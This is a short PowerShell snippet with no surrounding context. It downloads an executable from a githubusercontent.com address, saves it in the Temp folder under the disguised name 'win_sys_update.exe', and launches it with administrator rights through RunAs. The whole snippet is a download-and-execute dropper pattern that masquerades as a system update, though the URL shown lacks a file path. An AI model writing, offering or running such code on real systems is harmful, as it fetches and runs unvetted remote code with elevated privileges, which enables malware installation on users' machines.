$url = "https://githubusercontent.com"
$path = "$env:LOCALAPPDATA\Temp\win_sys_update.exe"
Invoke-WebRequest -Uri $url -OutFile $path
Start-Process -FilePath $path -Verb RunAs
